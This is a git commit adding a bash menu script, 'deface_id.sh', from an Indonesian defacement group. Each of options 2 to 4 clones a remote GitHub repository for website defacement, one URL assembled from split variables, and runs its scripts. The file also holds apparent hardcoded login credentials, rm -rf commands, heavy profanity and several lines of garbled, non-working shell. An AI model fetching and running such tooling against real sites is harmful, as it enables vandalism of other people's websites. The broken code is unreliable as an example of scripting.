7d72a2f4ef9259d33e5ad3d529c5c2b27d57ec61
Diki Andreano <92381721+panglima-jateng@users.noreply.github.com>
2023-01-25 14:48:07 +0700

    Add files via upload

---
+++ deface_id.sh
@@ -0,0 +1,96 @@
+#!/bin/bash
+# mau recode silahkan
+# code by panglima jateng
+hacked_by='prajurit-pajat' # ganti dengan nama kalian
+# mengetik
+mengetik(){
+for i in {1..70}; do
+    echo -e -ne "\r${mull:0:$i}"; sleep 0.05
+done
+echo
+}
+# code warna
+merah='\e[1;31m'
+putih='\e[1;37m'
+hijau='\e[1;32m'
+birum='\e[0;36m'
+abuuu='\e[1;30m'
+fonction(){
+https://panglimajateng.co/index.html $_anjay_mabar_hesello_kontol
+user:panglima@email.com              $_kena_mental_luh_tong
+pass:kend2278yes                     $_pala_bapak_kau
+https://programer_termux.id          $_ngising_dulu_sana_kalo_mau_entod
+user:progem@email.com                $_pasword_apa_itu_man
+pass:kon56709                        $otaknyakagaada
+}
+eh(){
+echo -r do done while koe jancok $aman_aman_saja
+print for me "lu kira enak record codinga  punya gw meakipun kaga di encripr wkwk"
+${html} yh di kira apa lu cok
+}
+# variabel
+$panglimajatengfrombyprajuritpajat
+c=clone;g=git;gh="github.com";satu="GyHvJbFgIjVtt_gUg-ihavu_ijbabnsOINNO999_678hHvbKn";panglima_jateng='echo -e';h=https
+figlet welcome | lolcat
+echo 'sekedar mengingatkan:' | lolcat
+echo '=======================' | lolcat
+sleep 1
+echo 'SAHABAT BERTANYA:' | lolcat
+sleep 1
+mull='apa yang lebih najis dari air liur anjing ya rosulullah'
+mengetik
+sleep 1
+echo 'RASULULLAH MENJAWAB:' | lolcat
+sleep 1
+mull='adalah wanita yang berkata kasar'
+mengetik
+# TAMPILAN
+rm -rf WEBDAV
+rm -rf LITESCRIPT
+rm -rf GyHvJbFgIjVtt_gUg-ihavu_ijbabnsOINNO999_678hHvbKn
+clear
+echo -e ' '$merah'{'$putih'+'$merah'}'$abuuu' sholat bro modal skill deface'
+echo -e ' '$merah'{'$putih'+'$merah'}'$abuuu' kaga bisa merubah tampilan neraka'
+echo -e $hijau'========================================'
+$panglima_jateng $merah'     _       __                  _     _ ';$panglima_jateng $merah'  __| | ___ / _| __ _  ___ ___  (_) __| |';$panglima_jateng $merah' / _` |/ _ \ |_ / _` |/ __/ _ \ | |/ _` | {+} author : panglima jateng'
+$panglima_jateng $putih'| (_| |  __/  _| (_| | (_|  __/_| | (_| | {+} team   : aligator cyber indo';$panglima_jateng $putih' \__,_|\___|_|  \__,_|\___\___(_)_|\__,_| {+} pesan  : anti hacker aliansi';$panglima_jateng $hijau'===========================================================================';$panglima_jateng $abuuu'                          TO0LS AKANG DEAFCE'
+$panglima_jateng $hijau'---------------------------------------------------------------------------'
+$panglima_jateng $putih' 1. subribe author';$panglima_jateng $putih' 2. webdav tools';$panglima_jateng $putih' 3. script deface generator';$panglima_jateng $putih' 4. deface metode newbie';$panglima_jateng $putih' 5. exit'
+$panglima_jateng $hijau'---------------------------------------------------------------------------'
+read -p '=> ' depes;
+if [[ $depes == '1' ]]; then
+hek(){
+author : panglima jateng
+team   : mafia teknologi
+                           iya bang gw mah bocil termoZzzzz kagak jago kaya luuuuuu
+head echo cd do for in $apk https://panglima_jateng/download/ /sdcard
+$hapus
+}
+anjay=selow     # kentod
+bebeb=cinta     # kentod
+ayam=bashscript # kentod
+bebek=bash      # kentod
+singa=python
+# sayang ku kepadamu takan pernah layu maseeeeeh
+xdg-open https://www.youtube.com/@panglimajateng
+$bebek deface_id.sh
+elif [[ $depes == '2' ]]; then
+hek(){
+author : panglima jateng # kacau balau temen2
+team   : kontol eksport  # kacau balau temen2
+}
+git clone https://github.com/B41B4L/WEBDAV
+cd WEBDAV
+sh bahan.sh
+sh dav.sh
+elif [[ $depes == '3' ]]; then
+$g $c $h://$gh/4L13199/LITESCRIPT
+cd LITESCRIPT
+python2 LITESCRIPT.py
+elif [[ $depes == '4' ]]; then
+$g $c $h://$gh/$hacked_by/$satu
+cd $satu
+bash defacer.sh
+else
+    exit
+fi
